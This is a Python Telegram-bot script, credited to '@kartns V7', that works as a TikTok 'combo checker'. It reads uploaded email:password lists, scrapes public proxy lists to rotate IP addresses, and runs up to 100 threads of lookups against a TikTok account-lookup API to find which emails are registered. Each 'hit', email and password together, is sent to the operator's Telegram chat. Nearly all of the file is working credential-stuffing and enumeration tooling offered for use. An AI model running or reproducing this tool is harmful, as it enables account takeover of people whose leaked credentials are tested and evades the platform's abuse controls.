import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الألوان ---
class Colors:
    G = '\033[92m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[0m'

class Stats:
    hits = 0
    bad = 0
    checked = 0
    proxies_list = []
    is_running = False
    total_in_file = 0

# --- إدخال البيانات ---
TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
ADMIN_ID = input(f"{Colors.C}[?] Enter Your Telegram ID: {Colors.W}").strip()

try:
    bot = telebot.TeleBot(TOKEN)
    # اختبار الاتصال بالبوت فوراً
    me = bot.get_me()
    print(f"{Colors.G}[+] Connected to Bot: @{me.username}{Colors.W}")
except Exception as e:
    print(f"{Colors.R}[!] Token Error: {e}{Colors.W}")
    exit()

def scrape_proxies():
    print(f"{Colors.C}[*] Scrapping proxies...{Colors.W}")
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    Stats.proxies_list = []
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")

def check_tiktok(line):
    if ":" not in line: return
    email, password = line.split(":", 1)
    
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
    proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
    proxy = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None

    params = {"email": email, "aid": "1233", "device_platform": "android", "version_code": "240504"}
    
    try:
        # استخدام مهلة قصيرة لضمان السرعة
        response = requests.get(url, params=params, proxies=proxy, timeout=5)
        data = response.json()

        if data.get("message") == "success":
            Stats.hits += 1
            # إرسال Hit فوراً للأدمن فقط
            bot.send_message(ADMIN_ID, f"✅ **TikTok Hit!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
        else:
            Stats.bad += 1
    except:
        pass
    finally:
        Stats.checked += 1

# --- أوامر البوت ---
@bot.message_handler(commands=['start', 'status'])
def send_status(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    
    status_msg = f"""
📊 **Current Status:**
━━━━━━━━━━━━
🚀 Running: {Stats.is_running}
✅ Hits: {Stats.hits}
❌ Bad: {Stats.bad}
🔄 Checked: {Stats.checked} / {Stats.total_in_file}
🌐 Proxies: {len(Stats.proxies_list)}
━━━━━━━━━━━━
By @kartns V7
    """
    bot.reply_to(message, status_msg)

@bot.message_handler(content_types=['document'])
def handle_combo(message):
    if str(message.from_user.id) != ADMIN_ID:
        return

    if Stats.is_running:
        bot.reply_to(message, "⚠️ Wait! Checker is already running.")
        return

    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        if not os.path.exists("data"): os.makedirs("data")
        with open("data/combo.txt", "wb") as f:
            f.write(downloaded_file)
        
        combo = open("data/combo.txt", "r", encoding="utf-8", errors="ignore").read().splitlines()
        Stats.total_in_file = len(combo)
        
        bot.reply_to(message, f"📥 Received {Stats.total_in_file} accounts. Updating proxies and starting...")
        
        scrape_proxies()
        threading.Thread(target=process_checker, args=(combo,)).start()
    else:
        bot.reply_to(message, "❌ Please send a .txt file.")

def process_checker(combo):
    Stats.is_running = True
    Stats.hits = 0
    Stats.bad = 0
    Stats.checked = 0
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(check_tiktok, combo)
    
    Stats.is_running = False
    bot.send_message(ADMIN_ID, "🏁 **Check Completed!**")

if __name__ == "__main__":
    print(f"{Colors.G}[+] Bot is polling... Send /start in Telegram.{Colors.W}")
    bot.infinity_polling()
